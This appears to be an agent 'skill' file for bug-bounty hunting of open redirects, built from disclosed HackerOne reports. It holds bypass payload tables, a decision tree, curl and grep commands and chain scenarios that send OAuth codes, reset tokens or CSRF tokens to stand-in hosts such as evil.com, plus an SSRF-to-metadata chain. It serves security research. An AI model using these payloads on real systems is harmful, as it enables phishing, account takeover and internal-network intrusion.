| Deny-list of malicious domains | chained redirects + `。` (ideographic full stop) | Two trusted redirects plus Unicode normalization defeat string matching (#1032610). |
| WAF strips/blocks `http-equiv` | `%00` inside the attribute name | Null byte breaks the WAF's attribute match while the browser still parses it (#978680). |
| "Fix" applied | original PoC verbatim, then close variants | Regressions are the norm (#439075, #562417, #1285081, #127741). |
| No `Location:` in curl, browser still moves | `#/path///evil.example`, base64 `redirect_url` | JS/DOM sink — needs browser confirmation (#753399, #1977222, #38157). |

### Minimal reproduction template (what your PoC should contain)

```
1. Victim-origin URL:  https://target.com/<vulnerable path>?<param>=<payload>
2. Request:            GET ... HTTP/1.1  (+ any Host/X-Forwarded-Host header)
3. Response:           HTTP/1.1 30x
                       Location: <attacker destination>
4. Browser result:     navigation lands on https://evil.example (screenshot)
5. Chained proof:      <auth code | access token | reset token> captured at listener
6. Fix-bypass note:    original #id payload / patch, and why it still works
```

### Attribution / proof pattern
Always demonstrate a **specific secret** reaching you for chained cases:
- OAuth: capture `?code=...` or `#access_token=...` at your listener (#905607, #665651).
- Authenticity/CSRF token: open redirect that leaks `authenticity_token` (#49759, #50752).
- Reset token: `X-Forwarded-Host` poisoning in a password-reset email link (#698416).
- Session/`user_id`: after-login redirect that discloses both (#239503).

---

## Common Root Causes

Grounded in the corpus's recurring patterns, in rough frequency order:

1. **No validation of the redirect target** — the app redirects to a user-supplied value verbatim. The dominant root cause across `redirect-handling` (291) and `open-redirect` (233): `?url=`, `?next=`, `?checkout_url=` passed straight to the redirector (#683298, #103772, #504751).
2. **Weak/bypassable validation** — a filter exists but checks the wrong thing: only the start of the string (#840736 "can be bypassed only from its beginning"), a case-sensitive `http` check (#411723), a naive "trusted domain present anywhere" test (#236599), or an incomplete regex (#3723458, #411723).
3. **Redirect derived from a trusted-but-attacker-influenced source** — the `Host`/`X-Forwarded-Host` header (#2828499, #1444675), a cookie (`last_shop` #161991), or a path segment the edge normalizes differently from the origin (#320376, #297803, #193027).
4. **OAuth redirection design flaws** — `redirect_uri` not strictly allowlisted (#665651), `state` reused as a redirect carrier (#206591), token endpoints that redirect with the code in the URL (#3099816, #3419636, #3423013), or validation disabled by an invalid `scope` (#972601).
5. **Client-side sink with unsanitized input** — `window.location` from `URLSearchParams`, hash, or base64 value, invisible to server-side checks (#753399, #1977222, #38157).
6. **Inconsistent protection coverage** — the redirect guard exists on one content type or surface but not another (pixiv protects illustrations/jump.php but not novels #541862), or is removed after login/interstitial (#111968).
7. **Framework / dependency default behavior** — Express `redirect: true` static middleware and CVE-2015-1164 (#1354255), Rails ActionPack open redirect (#904059), `fastify-static` double-slash (#1354255).
8. **Patch regression / incomplete fix** — a reported redirect is "fixed" but bypassable again: HackerOne index.php fixed three times (#320376 → #439075 → #562417), Reddit `failed` param fixed then bypassed (#1257753 → #1285081), Twitter teams callback (#283460), New Relic (#127741).
9. **Server-side redirect following** — a URL fetcher follows 30x to internal/external targets without revalidation, turning a redirect into SSRF (#3286945, #771465, #905737).

### Root cause → fastest confirming test

| Root cause | Fastest test | Confirming evidence |
|-----------|--------------|---------------------|
| No validation | baseline `?p=https://evil.example` | `Location:` equals your input verbatim. |
| Weak validation | case/backslash/decimal variants | Only one variant produces the external `Location:`, revealing the exact check. |
| Header-derived target | `X-Forwarded-Host: evil.example` | `Location:` changes with the header value while the query stays constant. |
| Cookie-derived target | tamper `last_shop` cookie | Redirect target changes with the cookie (#161991). |
| OAuth design flaw | arbitrary `redirect_uri` + `response_type=token` | Token/code delivered to your domain (#665651, #3099816). |
| Client-side sink | browser with `#/path///evil.example` | Navigation without any server 30x (#753399). |
| Coverage gap | test second content type / endpoint | One surface guarded, sibling not (#541862). |
| Framework default | double-slash `//` against static middleware | `redirect: true` modules emit external `Location:` (#1354255). |
| Patch regression | original reported PoC | Previously "fixed" URL redirects again (#562417). |
| Server-side follow | Collaborator as redirect target | DNS/HTTP callback proves server fetched the destination (#3286945). |

---

## Bypass Techniques

### Path / slash class
| Technique | Payload | Source |
|-----------|---------|--------|
| Triple slash | `https://target.com///evil.com` | #1213580, #753399 |
| Double slash protocol-relative | `//evil.com` | #380939, #283460 |
| URL as path | `https://target.com/http://evil.com/` | #469803, #297803 |
| Backslash | `/\evil.com`, `/%5cevil.com` | #193027, #840736 |
| index.php prefix rewrite | `/index.php/index.php.evil.com` | #320376, #439075 |
| Dotdot suffix | `//evil.com/%2f..`, `//evil.com/%2e%2e%2f` | #261592, #66384 |
| Hash route | `#/path///google.com` | #753399, #38157 |

### Encoding / normalization class
| Technique | Payload | Source |
|-----------|---------|--------|
| Percent-encoded slashes | `%2f%2f%2fevil.example%2f` | #504751 |
| Double encoding | `%2523`, `%252f` | #905607 |
| Null byte | `...%00equiv="refresh"` | #978680 |
| Case variation | `Http:`, `Localhost` | #411723 |
| Decimal IP | `Http:3627732462` (= google.com) | #411723 |
| Unicode / homograph | ideographic full stop `。`, hex homoglyph | #1032610, #59372 |
| Base64 in param/path | `?redirect_url=<base64>` | #1977222 |
| Double URL-encode | `%253A%252F%252F` (applies to fetch sinks) | SSRF-style chaining |

### Filter / allowlist class
| Technique | Payload | Source |
|-----------|---------|--------|
| At-sign userinfo | `//allowlisted.tld@evil.example/%2e%2e/` | #625546 |
| Prefix/suffix domain | `checkout_url=.np` → `shop.myshopify.com.np` | #103772 |
| Backslash breaks trusted string | `http://evil\target.com/../../../` | #840736 |
| Regex bypass | regex allowed only specific URLs → craft matching-but-external | #3723458 |
| Invalid scope disables check | `scope=ggg` + arbitrary `redirect_uri` | #972601 |
| Parameter toggle | `&noredirect=true` → `false` | #246897 |
| Multi-protocol abuse | `url=` accepts many protocols → pick `javascript:`/`data:` | #459286 clue, #683298 |

### Header / proxy class
| Technique | Payload | Source |
|-----------|---------|--------|
| Host header | `Host: evil.example` | #2828499, #210875 |
| X-Forwarded-Host | `X-Forwarded-Host: evil.example` | #1479889, #1444675 |
| Extra headers via MITM/proxy | inject headers to force remote redirect | #1397804 |
| Reset-link poisoning | `X-Forwarded-Host: attacker.com/.target.com` in reset request | #698416 |

### Special sinks
- **Mobile intent/URI** — `adb shell am start -n pkg/.Activity -d "javascript:..."` and `-d "http://evil"` (#499348, #2555949).
- **SVG upload** — embed JS/meta redirect in an `.svg` hosted on the trusted origin (#368927).
- **CSP allowlist abuse** — `frame-src` lists a free host (`*.firebaseapp.com`) → iframe redirect (#1166766).
- **Chained redirects** — two open redirects plus Unicode normalization defeat link-block lists (#1032610); chained + interstitial bypass (#111968).

> Note on backslash/`@`/dotdot: browsers and frameworks parse these differently (Chrome vs Firefox vs backend router). Always confirm the final landed origin in a real browser, not just the raw `Location:` string (#260744 shows a Location/on-page-link differential enabling XSS).

### Bypass decision tree

```
Is the baseline `https://evil.example` rejected?
├─ Yes -> Is `//evil.example` accepted?
│         ├─ Yes -> protocol-relative bypass (#380939, #283460)
│         └─ No  -> Does the trusted domain string appear anywhere in the URL?
│                   ├─ Yes -> put the trusted string in userinfo/path: evil\target.com / allow@evil/%2e%2e (#840736, #625546)
│                   └─ No  -> Is there a regex/allowlist?
│                             ├─ Yes -> suffix confusion: target.com.evil.com, checkout_url=.np (#103772, #3723458)
│                             └─ No  -> try encoding: %2f, %2523, %00, Unicode 。 (#504751, #905607, #978680, #1032610)
└─ No  -> Baseline works. Now maximize impact:
          ├─ OAuth flow present? -> redirect_uri / state / invalid scope (#665651, #206591, #972601)
          ├─ javascript: accepted? -> redirect-to-XSS (#683298, #330008)
          ├─ fetched server-side? -> SSRF (#3286945, #771465)
          └─ patch applied? -> regression check (#439075, #1285081)
```

### Gotchas when validating a bypass

- A `Location:` header that *looks* external is not always followed by the browser — browsers normalize `/\` and `..` before navigating. Verify the landed origin (#193027, #260744).
- A bypass may work only from the **beginning** of the trusted string, not after it (#840736), or only for a specific browser (#260744 lists Chrome/Firefox/Opera differences).
- Some "bypasses" require a **user action** (login, clicking a link on a 404 page after 2 seconds — #158434) or a **specific state** (logged out / email unverified — #1444675). State the prerequisites in your report.
- Chained Unicode/IDN tricks can be neutralized by the browser's own punycode conversion — test the final rendered host, not the raw payload (#1032610, #59372).
- Header-based redirects may be **cacheable**; a poisoned `Host`/`X-Forwarded-Host` response can persist for other users via the cache layer (#297803, #193027, `cache-layer: 24`).

---

## Gate 0 Validation

Before submitting, answer all three. A bare redirect is not a report on most programs; the corpus is full of standalone redirects closed as N/A or out-of-scope.

### 1. What can the attacker DO right now?
- Can you show a victim navigating from the **trusted origin** to an attacker destination with a realistic click path (login button, short link, reset email)?
- For chained cases: can you show the exact secret (auth code, access token, authenticity token, reset token, session id, `user_id`) actually arriving at your listener?
- "The Location header points to evil.com" alone is insufficient — state where the victim starts, what they click, and what the attacker gains.

### 2. What does the victim LOSE?
- **Full ATO** via OAuth code/token theft → Critical (#905607, #665651, #206591, #3423013).
- **Credentials** via a trusted-looking phishing page → Low–Medium (#683298, #380939).
- **Account/session** via login CSRF + redirect → Medium–High (#171398, #239503).
- **Internal access** via server-side redirect → SSRF → High (#3286945).
- If the only loss is "user visits another site," expect Low/Informative or N/A — still report only if the program accepts it or if you can strengthen the chain.

### 3. Can it be reproduced in 10 minutes from scratch?
- Is the endpoint live and the parameter/sink still present?
- Does the redirect fire reliably in a browser (not just one curl with a specific user-agent)?
- For fix-bypasses: does the payload still work after the program's patch (this corpus has many regressions — #439075, #562417, #1285081)?
- Could a second person follow your steps without prior knowledge and land on the attacker page?

### Validation checklist
```
[ ] Exact vulnerable URL + parameter identified
[ ] Raw HTTP request/response captured (status + Location header)
[ ] Browser proof of final navigation to attacker-controlled origin
[ ] Chained secret captured (if claiming ATO / token theft)
[ ] Scope confirmed; standalone-redirect policy checked
[ ] Negative control: benign redirect stays on-domain (proves validation logic)
[ ] Fix-bypass: original patched payload documented for contrast (if applicable)
```

### Severity rubric (calibrate against the corpus)

| Finding shape | Typical severity | Example reports |
|---------------|------------------|-----------------|
| Standalone redirect, no chain, no secret | Low / Informative / N/A | #2957962, #1213580, #753399, #241484 (out of scope) |
| Redirect to external domain on high-trust brand (phishing) | Low–Medium | #380939, #469803, #541862 |
| Redirect + `javascript:` → XSS | Medium–High | #683298 ($1,540), #260744 ($1,120), #330008 ($1,120) |
| Host-header poisoning in reset/account links → token leak | High | #698416, #239503, #1444675 ($300) |
| OAuth `redirect_uri` / `state` → code/token theft → ATO | Critical | #905607, #665651 ($750), #206591, #3423013 ($1,000) |
| Server-followed redirect → SSRF / internal access | High | #3286945, #771465, #905737 |

### If you cannot prove impact, say so plainly
The corpus contains many honest reports whose stated impact is only "users could get redirected to a malicious domain" (#469803, #753399, #504751, #967284). Those were still disclosed, and some paid small bounties — but they are the bottom of the severity scale. If your goal is a High/Critical, invest the extra hour in the OAuth/host-header/SSRF chain rather than collecting a tenth standalone redirect.

---

## Real Impact Examples

### Scenario A — OAuth code theft → full account takeover (CS Money, #905607)
A path-based open redirect on `cs.money` (`https://cs.money///google.com`) was chained into the Steam OAuth login: `auth.dota.trade/login?redirectUrl=https://cs.money///attacker.netlify.app%2523&callbackUrl=...`. After the victim logged in through Steam, the app redirected to the attacker-controlled netlify subdomain carrying `?token=...`. The attacker captured the victim's auth token from their listener → complete account takeover. Root cause: unvalidated path redirect + double-encoded `#` fragment + a callback that forwarded the token. This is the canonical Critical open-redirect chain in the pack.

### Scenario B — OAuth `redirect_uri` token leak (GSA `login.fr.cloud.gov`, #665651)
`https://login.fr.cloud.gov/oauth/authorize?...&response_type=token&redirect_uri=https://evil.com/auth/callback` accepted an arbitrary `redirect_uri`. After a victim chose a `.gov` account and logged in, they were redirected to `evil.com` with the OAuth access token in the URL. Impact stated in the report: attacker steals the token and takes over the account — $750, High.

### Scenario C — `state` parameter as redirect carrier (Uber `central.uber.com`, #206591)
An error in the OAuth2 flow let the `state` parameter of `login.uber.com` contain a redirect location instead of a CSRF token, producing an open redirect leveraged into a full account takeover of `central.uber.com`. Demonstrates that non-obvious parameters (`state`, `authorize_callback` #283460, `RelayState` #2263044) can be the actual redirect sink.

### Scenario D — Host-header poisoning in reset links (New Relic, #698416 / Omise, #1444675 / Localize, #2828499)
By adding `X-Forwarded-Host: attacker.com/.newrelic.com` to a password-reset request, the generated reset link pointed at the attacker's host; the victim received the poisoned link by email, and clicking it leaked the reset token → full ATO. Omise and Localize show the same primitive producing open redirects and content spoofing. Header-driven redirects are especially dangerous because the victim receives a legitimate-looking email from the real domain.

### Scenario E — "Fix bypass" resurfacing (HackerOne index.php, #320376 → #439075 → #562417)
`https://www.hackerone.com/index.php/index.php.hacker0ne.com` redirected to `www.hackerone.com.hacker0ne.com`, a domain the attacker controls. Marked fixed, then reproduced again in #439075 and again in #562417. Lesson: a redirect's patch is often incomplete; always retest the original payload and close variants after a fix. The same theme appears in Reddit (`failed` param, #1257753 → #1285081), pixiv jump.php (#541862), Twitter protection bypass (#330008), and Myndr's backslash bypass (#840736).

### Scenario F — Server-side redirect → full-read SSRF (Grafana, #3286945)
An open-redirect vector was chained into a stored XSS and then a full-read SSRF against an internal target, using a redirect that the server followed. This converts a Low redirect into a High internal-network-access finding. Related: Shopify `plus/get-cdn-asset?asset=http://evil.com/?` (#905737) and the open-redirect/SSRF bypass in #771465.

### Scenario G — DOM redirect → phishing / data exfiltration (NordVPN, #753399 / QIWI, #38157 / Acronis, #1245165)
NordVPN's support page used `window.location.href = document.URL.slice(...)` on `#/path`, so `https://support.nordvpn.com/#/path///google.com` navigated off-origin — no server `Location:` header involved. QIWI's minified JS reassigned `this.wc.href` from the hash. Acronis combined CSS injection, client-side path traversal, and open redirect to exfiltrate personal data. Confirm these in a browser; curl will report no redirect.

### Scenario H — Authenticity-token leak → full account takeover (Twitter, #49759 / #50752)
An open redirect on a Twitter domain could forward the victim's `authenticity_token` to any website or IP address. Because the CSRF token rides the redirect, the attacker gains a state-changing capability against the victim's session — escalated to full account takeover. The lesson generalizes: any redirect on a page that embeds a CSRF token in a link or hidden field is a token-exfiltration primitive, not merely phishing (#239503 extends this to `user_id` and an authentication token).

### Scenario I — Password-reset token theft via poisoned host (New Relic, #698416)
Intercepting the `forgot password` request and adding `X-Forwarded-Host: attacker.com/.newrelic.com` caused the reset email to contain `https://attacker.com/.newrelic.com/passwords/reset/<token>`. The victim receives a legitimate-looking email from New Relic; clicking it delivers the reset token to the attacker's host → full ATO. This is the highest-value host-header chain in the pack because the victim is *mailed the weaponized link by the trusted site itself*.

### Scenario J — Chained redirects defeat a link deny-list (X / xAI, #1032610)
Twitter blocks posting links to deny-listed domains. A chain of two open redirects — one on `analytics.twitter.com` (`rd=` with a URL-encoded trailing `?`) and one on `twitter.com` (`redirect_after_login=`) — combined with an Ideographic Full Stop (`。`) let a user distribute a link to a blocked domain through the platform's own trusted redirectors. $560, Medium. Demonstrates that "low-impact" redirects can combine into a capability the platform explicitly tried to prevent.

### Scenario K — Redirect → XSS through Request-URI differential (dev.twitter.com, #260744 / #330008)
The same user-controlled path was processed differently in the HTTP `Location:` header and in the on-page `<a href>` link. By crafting an invalid port to stop Firefox from following the 302, the researcher made the victim see and click an on-page `javascript:alert(document.cookie)` link hosted on the trusted domain (#260744, $1,120). A follow-up report (#330008, $1,120) found the same class after chained subdomain path confusion. Redirects that reflect into HTML are XSS candidates, not just navigation bugs.

---

## Disclosed Report Citations

All IDs below are real and appear in the study pack. Format: **Company — title** ([H1 #id](https://hackerone.com/reports/id)) — subclass, technique, year/bounty.

1. **CS Money — [cs.money] Open Redirect Leads to Account Takeover** ([H1 #905607](https://hackerone.com/reports/905607)) — OAuth ATO chain, path `///` redirect + double-encoding, 2020 / unpaid.
2. **X / xAI (MoPub) — XSS and Open Redirect on MoPub Login** ([H1 #683298](https://hackerone.com/reports/683298)) — `next=` param + `javascript:` URI → XSS, 2019 / $1,540.
3. **Upserve — Open redirect at https://inventory.upserve.com/http://google.com/** ([H1 #469803](https://hackerone.com/reports/469803)) — URL-as-path redirect, 2018 / $1,200.
4. **XVIDEOS — Open redirect** ([H1 #2957962](https://hackerone.com/reports/2957962)) — `href` attribute manipulation to external site, 2025 / unpaid.
5. **X / xAI (Twitter Lite Android) — local file steal, Javascript injection, Open redirect** ([H1 #499348](https://hackerone.com/reports/499348)) — exported Activity + intent URI, 2019 / unpaid.
6. **Nord Security — Open redirect** ([H1 #753399](https://hackerone.com/reports/753399)) — DOM-based `window.location.href` slice via `#/path`, 2019 / unpaid.
7. **Affirm — Open Redirect** ([H1 #1213580](https://hackerone.com/reports/1213580)) — triple-slash path redirect, 2021 / $250.
8. **X / xAI (dev.twitter.com) — XSS and Open Redirect** ([H1 #260744](https://hackerone.com/reports/260744)) — Request-URI/Location differential → XSS, 2017 / $1,120.
9. **Localize — open redirected by host header** ([H1 #2828499](https://hackerone.com/reports/2828499)) — Host header poisoning, 2024 / unpaid.
10. **Omise — Open Redirect** ([H1 #504751](https://hackerone.com/reports/504751)) — URL-rewrite with encoded slashes, 2019 / $100.
11. **X / xAI — Chained open redirects and Ideographic Full Stop defeat Twitter's link blocking** ([H1 #1032610](https://hackerone.com/reports/1032610)) — chained redirects + Unicode normalization, 2020 / $560.
12. **Lichess — Open Redirect Vulnerability in OAuth Flow Leading to Potential Phishing** ([H1 #3099816](https://hackerone.com/reports/3099816)) — `redirect_uri` manipulation, 2025 / unpaid.
13. **Clario — Google API key leaks and misconfiguration leads Open Redirect** ([H1 #1066410](https://hackerone.com/reports/1066410)) — URL-shortener regex misconfig, 2020 / $300.
14. **GSA Bounty — Stealing Users OAuth Tokens through redirect_uri parameter** ([H1 #665651](https://hackerone.com/reports/665651)) — OAuth token theft → ATO, 2019 / $750.
15. **Shopify — Open redirect using theme install** ([H1 #101962](https://hackerone.com/reports/101962)) — `domain_name` param redirect, 2015 / unpaid.
16. **Omise — Open redirect Via X-Forwarded-Host** ([H1 #1479889](https://hackerone.com/reports/1479889)) — X-Forwarded-Host poisoning, 2022 / unpaid.
17. **Chaturbate — Open redirection at https://chaturbate.com/auth/login/** ([H1 #411723](https://hackerone.com/reports/411723)) — `next=` filter bypass via `Http:` + decimal IP, 2018 / unpaid.
18. **Starbucks — Open Redirection in Login - Korean Starbucks** ([H1 #380939](https://hackerone.com/reports/380939)) — `redirect_url` protocol-relative, 2018 / unpaid.
19. **HackerOne — Open Redirection in index.php page** ([H1 #320376](https://hackerone.com/reports/320376)) — path-prefix rewrite, 2018 / unpaid.
20. **Unikrn — [crm.unikrn.com] Open Redirect** ([H1 #297803](https://hackerone.com/reports/297803)) — double-slash path + cache layer, 2017 / unpaid.
21. **Omise — Host Header Injection leads to Open Redirect and Content Spoofing** ([H1 #1444675](https://hackerone.com/reports/1444675)) — X-Forwarded-Host poisoning, 2022 / $300.
22. **X / xAI — [dev.twitter.com] XSS and Open Redirect Protection Bypass** ([H1 #330008](https://hackerone.com/reports/330008)) — chained subdomain path + XSS, 2018 / $1,120.
23. **HackerOne — SSO-SAML Login CSRF, Open Redirect, and Self-XSS** ([H1 #171398](https://hackerone.com/reports/171398)) — SAML flow auto-start + external redirect, 2016 / unpaid.
24. **Nextcloud — swfupload.swf allows open redirect / site defacement** ([H1 #209520](https://hackerone.com/reports/209520)) — Flash upload param `buttonImageURL`, 2017 / unpaid.
25. **pixiv — Open redirect protection (jump.php) broken for novels** ([H1 #541862](https://hackerone.com/reports/541862)) — inconsistent protection coverage, 2019 / $200.
26. **Reddit — Open Redirect on www.redditinc.com via `failed` query param** ([H1 #1257753](https://hackerone.com/reports/1257753)) — POST/CSRF-driven redirect, 2021 / unpaid.
27. **U.S. Dept Of Defense — Android: Javascript Injection and Open redirect** ([H1 #2555949](https://hackerone.com/reports/2555949)) — exported WebView + `javascript:`/`http://` intent, 2024 / unpaid.
28. **Brave Software — Browser not following proper flow for redirection** ([H1 #1579374](https://hackerone.com/reports/1579374)) — link-shim redirect bypass, 2022 / $500.
29. **Myndr — Open Redirect filter bypass through '\' character** ([H1 #840736](https://hackerone.com/reports/840736)) — backslash breaks allowlist string, 2020 / unpaid.
30. **Acronis — CSS Injection via Client Side Path Traversal + Open Redirect → data exfil** ([H1 #1245165](https://hackerone.com/reports/1245165)) — DOM-based chained redirect, 2021 / unpaid.

---

## Related Skills & Chains

- **hunt-oauth / hunt-ato** — the primary chain: an open redirect inside a trusted `redirect_uri` converts a Low redirect into Critical token theft → ATO (#905607, #665651, #206591, #3423013). Chain primitive: open redirect on trusted origin → auth code/token in redirect URL → victim's account.
- **hunt-ssrf** — an open redirect that the server follows is an SSRF primitive; point the redirect at cloud metadata or internal services (#3286945, #771465, #905737). Chain primitive: open redirect → 302 follow → IMDS/internal service → full-read SSRF.
- **hunt-xss** — `javascript:` / `data:` URIs and meta-refresh injection turn a redirect into XSS (#683298, #260744, #330008, #978680). Chain primitive: redirect sink → `javascript:` scheme → script execution on trusted origin.
- **hunt-csrf** — login/logout CSRF plus a redirect yields session fixation and data leak (#171398, #1257753, #239503). Chain primitive: auto-started auth flow + external `rurl`/`state` → victim session captured.
- **hunt-host-header** — Host / X-Forwarded-Host poisoning is a redirect factory for password-reset and short-link flows (#2828499, #1444675, #698416, #210875).
- **hunt-subdomain-takeover** — a redirect to a dead subdomain becomes claimable and weaponized (#206591, #292825). Chain primitive: open redirect to non-existent subdomain → register it → host phishing/token catcher on a trusted parent.
- **hunt-bypass / filter-evasion** — load the encoding/backslash/Unicode playbook before retesting any patched redirect; fix-bypasses are the single most repeated discovery pattern in the pack (#439075, #562417, #1285081, #840736, #1032610).
- **triage-validation** — apply the Gate 0 rules: no standalone redirect report without a demonstrated victim impact or a chained secret; always confirm the final landed origin in a browser.

### Cross-skill chain map (open redirect as the first hop)

```
open redirect on trusted origin
 ├─ + OAuth redirect_uri / state / authorize_callback -> token/code theft -> ATO      (hunt-oauth, hunt-ato)
 ├─ + javascript: / data: / meta-refresh reflection     -> XSS on trusted origin       (hunt-xss)
 ├─ + server-side 302 follow to internal/metadata URL  -> SSRF / full-read             (hunt-ssrf)
 ├─ + login/logout CSRF, attacker-controlled rurl       -> session fixation, data leak (hunt-csrf)
 ├─ + Host / X-Forwarded-Host in reset or short links   -> token leak via trusted email (hunt-host-header)
 ├─ + redirect to unregistered subdomain                -> takeover then host catcher  (hunt-subdomain-takeover)
 └─ + uploaded .svg / CSP-allowed free host             -> stored redirect / iframe     (hunt-file-upload, hunt-csp)
```

| If the redirect lands here | Load this skill next | Objective |
|----------------------------|----------------------|-----------|
| An `authorize` endpoint with a mutable `redirect_uri` | hunt-oauth | Capture `code`/`access_token` and demonstrate ATO. |
| A page that reflects the path into `<a href>` or meta refresh | hunt-xss | Convert to script execution on the trusted origin. |
| A URL fetcher that follows the 302 | hunt-ssrf | Reach metadata / internal services; confirm OOB. |
| A form with hidden `return_to`/`failed` fields | hunt-csrf | Build a cross-site POST that forces the redirect. |
| Any reset-password or short-link generator | hunt-host-header | Poison the generated absolute URL. |

Because the same primitive feeds so many chains, treat a confirmed open redirect as a **hub**, not an end finding: document it once, then spend the remaining time enumerating which secrets and sinks it can reach.

---

*End of skill. Built from 332 fully-read disclosed reports (389-report corpus). All technique frequencies, discovery clues, payloads, and 30 citations are grounded in the supplied study pack and TOPOPENREDIRECT list; no report ID or URL was invented.*


---

## Merged Source Knowledge

This section consolidates **10 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (18 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-open-redirect/SKILL.md`

## Crown Jewel Targets

Open redirect alone is Low. Chained to OAuth = Critical (ATO).

**Highest-value chains:**
- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
- **Open redirect → phishing** — users trust the URL because it starts with target.com
- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
- **Open redirect → session fixation** — force user to login endpoint with pre-set session

---

## Attack Surface Signals

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

## Bypass Table

| Technique | Payload |
|-----------|---------|
| Basic | `https://evil.com` |
| Protocol relative | `//evil.com` |
| Backslash bypass | `/\\evil.com` |
| At-sign confusion | `https://target.com@evil.com` |
| Double slash | `//evil.com/%2F..` |
| URL encoding | `%2Fevil.com` |
| Null byte | `evil.com%00target.com` |
| Whitespace | `evil.com%09` or `%20` |
| JavaScript URI | `javascript:window.location='https://evil.com'` |
| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
| Subdomain | `https://target.com.evil.com` |
| Fragment | `https://evil.com#.target.com` |

---

### Phase 3b — DOM-based open redirect (client-side sink)
Server-side `Location:` grepping misses redirects that happen purely in JS. Source (`location.hash`/`location.search`/`document.referrer`) assigned to a navigation sink.
```bash
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"

# Common shape:  var u=new URLSearchParams(location.search).get('url'); location=u;
```
(PortSwigger: DOM-based open redirection.)

# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
OAUTH_URL="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com

## Chain Table

| Open redirect finding | Chain to | Impact |
|----------------------|----------|--------|
| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
| Any open redirect | Phishing URL with target domain | Social engineering |
| Server-side redirect | SSRF via followed redirect | Internal service access |
| Logout redirect | Session fixation | Force login with known session |

---

## Validation

✅ Location header in response points to evil.com (your controlled domain)
✅ Browser follows redirect to attacker-controlled page

**Severity:**
- Redirect alone: Low (most programs)
- Chains to OAuth code theft → ATO: High/Critical
- Chains to phishing with brand name: Low-Medium
- Server-side → SSRF: High
